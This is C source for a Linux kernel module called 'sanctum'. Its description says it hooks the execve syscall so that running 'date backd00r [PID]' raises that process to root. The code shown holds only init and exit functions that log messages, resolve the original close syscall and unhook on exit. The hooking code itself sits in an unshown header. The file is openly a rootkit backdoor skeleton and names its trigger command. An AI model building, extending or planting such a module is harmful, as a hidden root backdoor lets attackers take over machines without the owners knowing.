#include "linux/kern_levels.h"
#include "linux/printk.h"
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/module.h>
#include "hooker.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yigit Colakoglu");
MODULE_DESCRIPTION("Hooks the execve syscall and matches 'date backd00r [PID]' to elevate PID to root");

static int __init sanctum_init(void)
{
  printk(KERN_INFO "All lights are green...\n");
  printk(KERN_INFO "Found sys_close %lx\n", (unsigned long) get_original_syscall(__NR_close));
  return 0;
}

static void __exit sanctum_exit(void)
{
  unhook_all();
}

module_init(sanctum_init);
module_exit(sanctum_exit);
